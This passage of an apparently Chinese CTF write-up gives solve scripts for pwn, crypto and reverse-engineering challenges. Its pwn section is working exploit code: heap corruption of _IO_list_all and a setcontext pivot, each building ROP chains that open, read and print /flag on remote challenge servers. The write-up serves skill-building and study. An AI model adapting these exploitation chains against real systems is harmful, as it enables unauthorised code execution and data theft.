arbwrite(11,1,1,0,0x280-0x40,orw_addr-0x8)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x288-0x40,magic2)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x268+0xa0-0x40,orw_addr+0x40)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x268+0xa8-0x40,ret)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x268+0xe0-0x40,heap_base+0x800)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

# open

payload=b""
arbwrite(11,1,1,0,0x2a8-0x40,pop_rdi)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x2b0-0x40,orw_addr)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x2b8-0x40,pop_rsi_rbp)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x2d0-0x40,pop_rax)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x2d8-0x40,2)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x2e0-0x40,syscall)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

# read

payload=b""
arbwrite(11,1,1,0,0x2e8-0x40,pop_rdi)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x2f0-0x40,3)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x2f8-0x40,pop_rsi_rbp)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x300-0x40,heap_base+0x800)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x318-0x40,pop_rsi_rbp)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x320-0x40,heap_base+0x800)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x328-0x40,orw_addr + 0x100-0x30)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x330-0x40,pop_rdx_leave)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x338-0x40,0x50)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x340-0x40,read_addr)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

# write

payload=b""
arbwrite(11,1,1,0,0x348-0x40,pop_rdi)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x350-0x40,1)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

payload=b""
arbwrite(11,1,1,0,0x358-0x40,write_addr)
continue0()

io.recvuntil("Please input some text (max size: 4096 bytes):\n")
io.sendline(payload)

###########################

payload=b""
arbwrite(8,1,1,4*0x18,0x368,libc_base+libc.symbols[b"_IO_list_all"]-0x20)   #next_size
free(11)
continue0()
io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

payload=b""
arbwrite(4,1,1,4*0x14,0x368,libc_base+0x205668-0x20)   #next_size
free(7)
continue0()
io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

payload=b""
arbwrite(0,1,1,4*0x10,0x368,libc_base+0x205660-0x20)   #next_size
free(3)
add(13,0x4f0)
continue0()
io.recvuntil("Please input some text (max size: 4096 bytes):\n")
# p()
io.sendline(payload)

print("tar= "+hex(tar))
print("magic_gadget= "+hex(magic_gadget))
sleep(0.5)

io.interactive()
```

## SU_baby

泄露 libc，控制 rip 返回地址跳转到 attack，设置 tar 为 setcontext，执行 rop

```python
#! /usr/bin/python3
from pwn import *
#pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

elf=ELF("./ASU1")
libc=ELF("./libc.so.6")

debug = 0

if debug:
    io = process('./ASU1')
    #io = remote('0.0.0.0',9999)
else:
    io = remote('1.95.76.73',10000)

def p():
    gdb.attach(proc.pidof(io)[0])

io.recvuntil("请选择操作:")
io.sendline("8")
io.recvuntil("需要添加几组模拟文件数据:")
io.sendline("1")

io.recvuntil("请输入文件名称")
# p()
io.sendline("a")
# sleep(0.5)
io.recvuntil("请输入文件内容")
io.sendline(b"a"*6+b'b')
# sleep(0.5)

io.recvuntil("请选择操作:")
io.sendline("9")
# p()

io.recvuntil(b"aab\x0a")
libc_base=u64(io.recv(6).ljust(8,b'\x00'))-0x080b12
print("libc_base= "+hex(libc_base))

io.recvuntil("请选择操作:")
io.sendline("8")
io.recvuntil("需要添加几组模拟文件数据:")
io.sendline("5")

io.recvuntil("请输入文件名称")
io.sendline("aaa")
io.recvuntil("请输入文件内容")
io.send(b"a"*8+b'\x00')
sleep(0.5)

io.recvuntil("请输入文件名称")
io.sendline("bbb")
io.recvuntil("请输入文件内容")
io.send(b"b"*9)
sleep(0.5)

io.recvuntil("请输入文件名称")
io.sendline("ccc")
io.recvuntil("请输入文件内容")
io.send(b"c")
sleep(0.5)

io.recvuntil("请输入文件名称")
io.sendline("ddd")
io.recvuntil("请输入文件内容")
io.send(b"d")
sleep(0.5)

io.recvuntil("请输入文件名称")
io.sendline("eee")
io.recvuntil("请输入文件内容")
# p()
io.send(b"ee"+b'\x56\x0f\x40')
# io.send(b"ee"+b'\x6d\x0f\x40')
sleep(0.5)

io.recvuntil("Good opportunity\n")
# p()
io.sendline(b"aaa")

io.recvuntil("What do you want to do?\n")
# p()
io.sendline(p64(0x400FA1))
# p()
setcontext=0x52085+libc_base

rdi=libc_base+0x000000000002164f
rsi=libc_base+0x0000000000023a6a
rdx_rsi=libc_base+0x0000000000130539
rax=libc_base+0x000000000001b500
syscall=0x11002F+libc_base
mopen=libc_base+libc.symbols[b'open']
mread=libc_base+libc.symbols[b'read']
mwrite=libc_base+libc.symbols[b'write']
flag_addr=0x6046A0+0x90

payload=flat({
    0x0:p64(setcontext),
    0x8:p64(rdi),
    0x10:p64(flag_addr),
    0x18:p64(rdx_rsi),
    0x20:p64(0),
    0x28:p64(0),
    0x30:p64(rax),
    0x38:p64(2),
    0x40:p64(syscall),
    0x48:p64(rdi),
    0x50:p64(3),
    0x58:p64(rdx_rsi),
    0x60:p64(0x50),
    0x68:p64(flag_addr),
    0x70:p64(mread),
    0x78:p64(rdi),
    0x80:p64(1),
    0x88:p64(mwrite),
    0x90:b'/flag\x00',
    0xa0:p64(0x6046A8),
    0xa8:p64(0x40144A),
},filler=b'\x00')

# p()
io.sendline(payload)

# p()

io.interactive()
```

# Crypto

## Mathgame

part1

伪素数

13079177569

parat2

https://www.quora.com/How-do-you-find-the-positive-integer-solutions-to-frac-x-y+z-+-frac-y-z+x-+-frac-z-x+y-4

增加循环次数，找到满足条件的比特数

```python
// For my colleagues in Shell with a lot of love,  (and  with a lot of time now since no commuting, cause COVID)
// Code is commented to explain how to solve the meme  (https://preview.redd.it/p92108lekoq11.jpg?width=367&format=pjpg&auto=webp&s=e0c84917c3d7e130cad06f9ab5a85634b0c88cfb)
//
// x/(y+z) + y/(x+z) + z/(x+y) = 4
//
// This is the smallest solution:
// x=4373612677928697257861252602371390152816537558161613618621437993378423467772036
// y=36875131794129999827197811565225474825492979968971970996283137471637224634055579
// z=154476802108746166441951315019919837485664325669565431700026634898253202035277999
//
// Paste in the site below to execute this code see this result, also read the comments here to understand.
// The last part of the prints() after executed shows you the solution above.
// http://magma.maths.usyd.edu.au/calc/
// Eduardo Ruiz Duarte
// toorandom@gmail.com
//


// First we define our environment for our "problem"

R<x,y,z> := RationalFunctionField(Rationals(),3);

problem := ((x/(y+z) + y/(x+z) + z/(x+y)) - 4) ;
// first note that we know a point after some computation (-1,4,11) that
// works but has a negative coordinate, the following function returns 0, which means that
// (x/(y+z) + y/(x+z) + z/(x+y)) - 4 = 0    (just put the -4 in the other side)
Evaluate(problem,[-1,4,11]);

// after the previous returned 0 , we know the point fits, we continue.

// we multiply by all the denominators of "problem" to get a polynomials
problem*Denominator(problem);
// we obtain a polynomial without denominators x^3 - 3*x^2*y - 3*x^2*z - 3*x*y^2 - 5*x*y*z - 3*x*z^2 + y^3 - 3*y^2*z - 3*y*z^2 + z^3
// We see is cubic, three variables, and every  term has the same degree (3) , therefore this is a cubic
// homogeneous curve,  we know there is a point which is not the solution we want
// the point (-1,4,11) fits in the original "problem" so it should fit in this new curve without denominators too (since no denominator becomes 0)

// We transform this equation to a "curve" in Projecive space of dimension 2
P2<x,y,z> := ProjectiveSpace(Rationals(),2);
C := Curve(P2,x^3 - 3*x^2*y - 3*x^2*z - 3*x*y^2 - 5*x*y*z - 3*x*z^2 + y^3 - 3*y^2*z - 3*y*z^2 + z^3);

// fit the point to the curve C (no error is returned)
Pt := C![-1,4,11];

// Since all cubic homogeneous curve with at least one point define an elliptc curve, we can transform
// this curve C to an elliptc curve form and just like in cryptography, we will add this known point (mapped to the corresponded curve)
// with itself until we get only positive coordinates and go back to C (original Problem)

// Below, E is the curve, f is the map that maps   Points f:C -> E  (C is our original curve without denominators, both curves C,E are equivalent
// but in E we can "Add points" to get another point of E.
// and with f^-1 we can return to the point of C which is our original solution

E,f := EllipticCurve(C);

//g is the inverse g:E->C  , f:C->E     so g(f([-1,4,11]))=[-1,4,11]
g := f^-1;

// We try adding the known point Pt=[-1,4,11] mapped to E, 2..100 times
// to see if when mapped back the added point to C gives positive coordinates
//, this is 2*Pt, 3*Pt, ...., 100*Pt  and then mapping back to C all these.
for n:= 1 to 20 do

// we calculate n times the point of C, known [-1,4,11] but mapped (via f) inside E (where we can do the "n times")
    nPt_inE:=n*f(Pt);

// we take this point on E back to C via f^-1  (which we renamed as g)
    nPt_inC:=g(nPt_inE);

//We obtain each coordinate of this point to see if is our positive solution,
// here MAGMA scales automatically the point such as Z is one always 1,
// so it puts the same denominators in X,Y, so numerators of X,Y are our
//solutions and denominator our Z,  think of  P=(a/c,b/c,1)   then c*P=(a,b,c)
    X := Numerator(nPt_inC[1]);
    Y := Numerator(nPt_inC[2]);
    Z := Denominator(nPt_inC[1]);



// We check the condition for our original problem.
  if ((X gt 0) and (Y gt 0)) then
       printf("GOT IT!!! x=apple, y=banana, z=pineapple, check the above solution\n");
       printf "X=%o\nY=%o\nZ=%o\n", X, Y, Z;

  else
     continue;
  end if;

end for;

// We check the solution fits in the original problem
if Evaluate(problem, [X,Y,Z]) eq 0 then
    printf "I evaluated the point to the original problem and yes, it worked!\n";
else
    printf "Mmm this cannot happen!\n";
end if;
a = 1440354387400113353318275132419054375891245413681864837390427511212805748408072838847944629793120889446685643108530381465382074956451566809039119353657601240377236701038904980199109550001860607309184336719930229935342817546146083848277758428344831968440238907935894338978800768226766379
b = 1054210182683112310528012408530531909717229064191793536540847847817849001214642792626066010344383473173101972948978951703027097154519698536728956323881063669558925110120619283730835864056709609662983759100063333396875182094245046315497525532634764115913236450532733839386139526489824351
c = 9391500403903773267688655787670246245493629218171544262747638036518222364768797479813561509116827252710188014736501391120827705790025300419608858224262849244058466770043809014864245428958116544162335497194996709759345801074510016208346248254582570123358164225821298549533282498545808644
```

part3

先看看时间戳能不能碰上，碰上了

```python
from sage.geometry.hyperbolic_space.hyperbolic_isometry import moebius_transform

from pwn import *
import time
context.log_level = 'debug'
io = remote("1.95.46.185", "10001")
io.recvuntil(b'[+] Plz Tell Me your number: ')
io.sendline("13079177569".encode())
io.recvuntil(b'[+] Plz give Me your a, b, c: ')
p2 = "1440354387400113353318275132419054375891245413681864837390427511212805748408072838847944629793120889446685643108530381465382074956451566809039119353657601240377236701038904980199109550001860607309184336719930229935342817546146083848277758428344831968440238907935894338978800768226766379, 1054210182683112310528012408530531909717229064191793536540847847817849001214642792626066010344383473173101972948978951703027097154519698536728956323881063669558925110120619283730835864056709609662983759100063333396875182094245046315497525532634764115913236450532733839386139526489824351, 9391500403903773267688655787670246245493629218171544262747638036518222364768797479813561509116827252710188014736501391120827705790025300419608858224262849244058466770043809014864245428958116544162335497194996709759345801074510016208346248254582570123358164225821298549533282498545808644"
io.sendline(p2.encode())
set_random_seed(int(time.time()))
io.recvuntil(b'[+] Plz Tell Me your answer: ')
C = ComplexField(999)
M = random_matrix(CC, 2, 2)
def Trans(z): return moebius_transform(M, z)

out = []
for _ in range(3):
    x = C.random_element()
    out.append((x, Trans(x)))

# print(out)
kx = C.random_element()
kx_str = str(kx).encode()
print(kx_str)
C2 = ComplexField(50)
ans = (Trans(kx))
io.sendline(str(ans))
io.recvline()
```

## checkin

```python
p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab
K = GF(p)
E = EllipticCurve(K, (0, 4))
o = 793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289
n1, n2 = 859267, 52437899
print(len(cs))

cs=[E(i) for i in cs]
tmp=52435875175126190479447740508185965837690552500527637822603658699938581184513
P=cs[0]*n2*tmp*n1
fstr=""
for i in range(len(cs)):
    Q=cs[i]*n2*tmp*n1
    try:
        k = discrete_log(P, Q,operation="+")
        if k:
            fstr+="0"
    except:
        try:
            k = discrete_log(Q, P,operation="+")
            if k:
                fstr+="0"
        except:
            fstr+="1"
            continue
print(fstr)
m=int(fstr,2)
print(long_to_bytes(m))
```

# RE

## SU_BBRE

```c
#include<stdio.h>

/*
RC4初始化函数
*/
void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k)
{
        int i = 0, j = 0;
        char k[256] = { 0 };
        unsigned char tmp = 0;
        for (i = 0; i < 256; i++) {
                s[i] = i;
                k[i] = key[i % Len_k];
        }
        for (i = 0; i < 256; i++) {
                j = (j + s[i] + k[i]) % 256;
                tmp = s[i];
                s[i] = s[j];
                s[j] = tmp;
        }
}

/*
RC4加解密函数
unsigned char* Data     加解密的数据
unsigned long Len_D     加解密数据的长度
unsigned char* key      密钥
unsigned long Len_k     密钥长度
*/
void rc4_crypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) //加解密
{
        unsigned char s[256];
        rc4_init(s, key, Len_k);
        int i = 0, j = 0, t = 0;
        unsigned long k = 0;
        unsigned char tmp;
        for (k = 0; k < Len_D; k++) {
                i = (i + 1) % 256;
                j = (j + s[i]) % 256;
                tmp = s[i];
                s[i] = s[j];
                s[j] = tmp;
                t = (s[i] + s[j]) % 256;
                Data[k] = Data[k] ^ s[t];
        }
}
void main()
{
        //字符串密钥
        unsigned char key[] = "suctf";
        unsigned long key_len = sizeof(key) - 1;
        //数组密钥
        //unsigned char key[] = {};
        //unsigned long key_len = sizeof(key);

        //加解密数据
    unsigned char data[16] = {
        0x2F,0x5A, 0x57,0x65,0x14,0x8F,0x69,0xCD,0x93,0x29,0x1A,0x55,0x18,0x40,0xE4,0x5E

};
    //加解密
        rc4_crypt(data, sizeof(data), key, key_len);

        for (int i = 0; i < sizeof(data); i++)
        {
                printf("%c", data[i]);
        }
        printf("\n");
        return;
}
#include <stdio.h>
int main(int argc, char const *argv[])
{

    char input[16];
    unsigned int check[] = {0x41,0x6D,0x62,0x4D,0x53,0x49,0x4E,0x29,0x28};


    for(int i = 0; i <= 8; i++) {
        printf("%c" , check[i] + i);


    }
    exit(0);

    return 0;
}
```

要跳转的地址是 0x40223D 把这三个结合起来就是 flag

## SU_minesweeper

```python
from z3 import *

mmap = [
    0x03, 0x04, 0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0x02, 0xFF, 0xFF,
    0x04, 0xFF, 0x07, 0xFF, 0xFF, 0xFF, 0x04, 0x06, 0x06, 0xFF,
    0xFF, 0xFF, 0xFF, 0x06, 0x05, 0x06, 0x04, 0xFF, 0x05, 0xFF,
    0x04, 0x07, 0xFF, 0x08, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0x06,
    0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0x03, 0xFF, 0x03,
    0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x05,
    0x04, 0x05, 0x07, 0x06, 0xFF, 0xFF, 0x04, 0xFF, 0x02, 0x01,
    0xFF, 0xFF, 0xFF, 0x03, 0x04, 0xFF, 0xFF, 0x05, 0x04, 0x03,
    0xFF, 0xFF, 0x07, 0x04, 0x03, 0xFF, 0xFF, 0x01, 0x01, 0xFF,
    0xFF, 0x04, 0x03, 0xFF, 0x02, 0xFF, 0x04, 0x03, 0xFF, 0xFF,
    0x02, 0xFF, 0x05, 0x04, 0xFF, 0xFF, 0x02, 0x02, 0xFF, 0xFF,
    0x04, 0xFF, 0x04, 0xFF, 0x03, 0x05, 0x06, 0xFF, 0xFF, 0x00,
    0xFF, 0xFF, 0xFF, 0x02, 0xFF, 0xFF, 0xFF, 0x01, 0x04, 0xFF,
    0xFF, 0x07, 0x05, 0xFF, 0xFF, 0x03, 0x03, 0x02, 0xFF, 0xFF,
    0x04, 0xFF, 0xFF, 0x05, 0x07, 0xFF, 0x03, 0x02, 0x04, 0x04,
    0xFF, 0x07, 0x05, 0x04, 0x03, 0xFF, 0xFF, 0x04, 0xFF, 0x02,
    0x04, 0x05, 0xFF, 0xFF, 0x06, 0x05, 0x04, 0xFF, 0x02, 0xFF,
    0xFF, 0x07, 0x04, 0xFF, 0xFF, 0x03, 0xFF, 0x04, 0x04, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x03, 0x02, 0x02,
    0xFF, 0xFF, 0x02, 0x04, 0x03, 0x05, 0xFF, 0xFF, 0x05, 0xFF,
    0x04, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF,
    0x03, 0x03, 0xFF, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06,
    0xFF, 0x06, 0x06, 0xFF, 0x07, 0x06, 0x04, 0xFF, 0x04, 0x03,
    0xFF, 0x04, 0x03, 0x05, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0x04, 0x06, 0x07, 0xFF, 0xFF, 0x04, 0xFF, 0xFF,
    0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x05, 0xFF, 0xFF, 0x06, 0x07,
    0x07, 0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0x02, 0x04, 0x04,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0x07, 0x07,
    0x06, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0x03,
    0x05, 0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x06, 0xFF, 0x05, 0xFF,
    0xFF, 0x07, 0x08, 0xFF, 0xFF, 0x03, 0xFF, 0x03, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0x06, 0x05, 0x03, 0xFF, 0x04, 0x05, 0x05, 0x03, 0xFF,
    0xFF, 0x06, 0x05, 0x05, 0x06, 0xFF, 0x06, 0x05, 0x02, 0x04,
    0x03, 0x04, 0xFF, 0xFF, 0x03, 0x04, 0x04, 0x06, 0x05, 0xFF,
    0x03, 0xFF, 0x05, 0x05, 0x05, 0xFF, 0xFF, 0x05, 0xFF, 0xFF,
    0x04, 0xFF, 0xFF, 0x04, 0xFF, 0x07, 0x07, 0x08, 0x06, 0xFF,
    0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0x04, 0xFF, 0x03,
    0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x05, 0x03
]

s = Solver()
flag = [BitVec(f'flag[{i}]', 8) for i in range(50)]

for i in range(20):
    for j in range(20):
        v2 = mmap[20*i+j]
        if v2 != 0xff:
            tmp = 0
            for ii in range(-1,2):
                for jj in range(-1,2):
                    if 0 <= i+ii < 20 and 0 <= j+jj < 20:
                        tmp += (flag[(20*(i+ii)+j+jj)//8] >> ((20*(i+ii)+j+jj) & 7)) & 1
                    else:
                        tmp += 0
            s.add(tmp == v2)

if s.check() == sat:
    m = s.model()
    print(m)
    # print(''.join([chr(m[flag[i]].as_long()) for i in range(50)]))
else:
    print('unsat')

flag = [0]*50

flag[5] = 30
flag[42] = 20
flag[34] = 204
flag[23] = 13
flag[14] = 128
flag[31] = 110
flag[38] = 182
flag[36] = 123
flag[37] = 168
flag[0] = 91
flag[13] = 142
flag[44] = 88
flag[25] = 145
flag[28] = 109
flag[18] = 143
flag[16] = 224
flag[27] = 9
flag[33] = 125
flag[43] = 70
flag[6] = 101
flag[48] = 236
flag[24] = 27
flag[49] = 125
flag[21] = 254
flag[30] = 27
flag[32] = 89
flag[4] = 197
flag[10] = 32
flag[26] = 109
flag[45] = 125
flag[29] = 111
flag[20] = 7
flag[46] = 97
flag[47] = 239
flag[12] = 33
flag[2] = 105
flag[39] = 59
flag[11] = 57
flag[8] = 181
flag[35] = 103
flag[41] = 29
flag[3] = 191
flag[7] = 251
flag[17] = 44
flag[1] = 219
flag[19] = 136
flag[22] = 116
flag[9] = 11
flag[15] = 7
flag[40] = 111

aa = ''
table = "abcdef0123456789"
for i in range(50):
    aa += table[flag[i]//16] + table[flag[i]%16]
print(aa)

import hashlib
hl = hashlib.md5()
hl.update(aa.encode(encoding='utf-8'))
print('MD5加密后为 ：' + hl.hexdigest())
```
